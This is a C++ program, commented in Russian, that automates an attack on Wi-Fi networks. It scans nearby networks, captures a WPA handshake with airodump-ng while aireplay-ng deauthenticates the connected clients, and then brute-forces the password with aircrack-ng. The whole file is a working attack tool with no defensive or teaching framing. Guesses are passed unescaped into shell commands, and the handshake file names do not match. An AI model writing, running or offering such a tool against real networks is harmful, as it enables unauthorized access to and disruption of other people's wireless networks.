#include <iostream>
#include <vector>
#include <string>
#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <unistd.h>
#include <sys/stat.h>
#include <thread>
#include <chrono>

// Функция для получения списка сетей с BSSID и каналами
std::vector<std::string> getNetworks() {
    std::vector<std::string> networks;
    system("iwlist scan 2>/dev/null | grep -E 'ESSID|Channel|Address' > networks.txt");

    FILE* file = fopen("networks.txt", "r");
    if (file) {
        char line[256];
        std::string currentNetwork;
        while (fgets(line, sizeof(line), file)) {
            std::string lineStr = line;
            if (lineStr.find("Address:") != std::string::npos) {
                if (!currentNetwork.empty()) {
                    networks.push_back(currentNetwork);
                }
                currentNetwork = lineStr.substr(lineStr.find("Address:") + 8);
                currentNetwork.erase(currentNetwork.find_last_not_of(" \n\r\t") + 1);
            } else if (lineStr.find("ESSID:") != std::string::npos) {
                std::string ssid = lineStr.substr(lineStr.find("ESSID:") + 7);
                ssid.erase(0, ssid.find_first_not_of("\""));
                ssid.erase(ssid.find_last_not_of("\"\n\r\t") + 1);
                currentNetwork += " | " + ssid;
            } else if (lineStr.find("Channel:") != std::string::npos) {
                std::string channel = lineStr.substr(lineStr.find("Channel:") + 8);
                channel.erase(channel.find_last_not_of(" \n\r\t") + 1);
                currentNetwork += " | Ch:" + channel;
            }
        }
        if (!currentNetwork.empty()) {
            networks.push_back(currentNetwork);
        }
        fclose(file);
    }
    return networks;
}

// Функция для захвата handshake
bool captureHandshake(const std::string& bssid, const std::string& channel) {
    std::cout << "Starting handshake capture for " << bssid << " on channel " << channel << "..." << std::endl;

    // Запускаем airodump-ng для захвата handshake
    std::string captureCmd = "xterm -e 'airodump-ng -c " + channel + " --bssid " + bssid + " -w capture wlan0mon' &";
    system(captureCmd.c_str());

    // Даем время на запуск
    std::this_thread::sleep_for(std::chrono::seconds(3));

    // Запускаем атаку деаутентификации
    std::string deauthCmd = "xterm -e 'aireplay-ng -0 10 -a " + bssid + " wlan0mon' &";
    system(deauthCmd.c_str());

    std::cout << "Waiting for handshake (30 seconds)..." << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(30));

    // Останавливаем процессы
    system("pkill airodump-ng");
    system("pkill aireplay-ng");

    // Проверяем, был ли захвачен handshake
    if (system("aircrack-ng -J capture.cap 2>/dev/null | grep -q 'Handshake'") == 0) {
        std::cout << "Handshake captured successfully!" << std::endl;
        return true;
    }

    std::cout << "Failed to capture handshake. Trying again..." << std::endl;
    return false;
}

// Рекурсивная функция для генерации и проверки паролей
bool bruteForceRecursive(const std::string& ssid, const std::string& charset, std::string& current, size_t length, const std::string& bssid) {
    if (current.length() == length) {
        std::cout << "Trying: " << current << std::endl;

        std::string command = "echo '" + current + "' | aircrack-ng -w - -b " + bssid + " capture-01.cap 2>/dev/null | grep 'KEY FOUND' > result.txt";
        system(command.c_str());

        FILE* resultFile = fopen("result.txt", "r");
        if (resultFile) {
            char resultLine[256];
            bool found = false;
            while (fgets(resultLine, sizeof(resultLine), resultFile)) {
                if (strstr(resultLine, "KEY FOUND")) {
                    std::cout << "SUCCESS! Password found: " << current << std::endl;
                    found = true;
                }
            }
            fclose(resultFile);
            if (found) {
                return true;
            }
        }
        return false;
    }

    for (char c : charset) {
        current.push_back(c);
        if (bruteForceRecursive(ssid, charset, current, length, bssid)) {
            return true;
        }
        current.pop_back();
    }
    return false;
}

// Функция для запуска брутфорса
void bruteForce(const std::string& ssid, const std::string& bssid) {
    const std::string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>?/";

    std::string current;
    for (size_t length = 8; length <= 12; ++length) {
        std::cout << "Trying passwords of length " << length << "..." << std::endl;
        if (bruteForceRecursive(ssid, charset, current, length, bssid)) {
            return;
        }
    }
    std::cout << "Password not found with current settings." << std::endl;
}

int main() {
    if (geteuid() != 0) {
        std::cout << "This program must be run as root. Use sudo." << std::endl;
        return 1;
    }

    // Переводим интерфейс в режим монитора
    system("airmon-ng check kill");
    system("airmon-ng start wlan0");

    std::vector<std::string> networks = getNetworks();
    if (networks.empty()) {
        std::cout << "No networks found. Check your wireless adapter." << std::endl;
        return 1;
    }

    std::cout << "Available networks:" << std::endl;
    for (size_t i = 0; i < networks.size(); ++i) {
        std::cout << i + 1 << ". " << networks[i] << std::endl;
    }

    int choice;
    std::cout << "Select network number: ";
    std::cin >> choice;

    if (choice > 0 && choice <= static_cast<int>(networks.size())) {
        std::string selectedNetwork = networks[choice - 1];

        // Извлекаем BSSID и канал из выбранной сети
        size_t pos = selectedNetwork.find(" | ");
        std::string bssid = selectedNetwork.substr(0, pos);

        size_t channelPos = selectedNetwork.find("Ch:");
        std::string channel = selectedNetwork.substr(channelPos + 3);

        // Захватываем handshake
        if (captureHandshake(bssid, channel)) {
            std::cout << "Starting brute force..." << std::endl;
            bruteForce(selectedNetwork, bssid);
        } else {
            std::cout << "Failed to capture handshake after multiple attempts." << std::endl;
        }
    } else {
        std::cout << "Invalid selection." << std::endl;
    }

    // Возвращаем интерфейс в обычный режим
    system("airmon-ng stop wlan0mon");
    system("service network-manager restart");

    return 0;
}
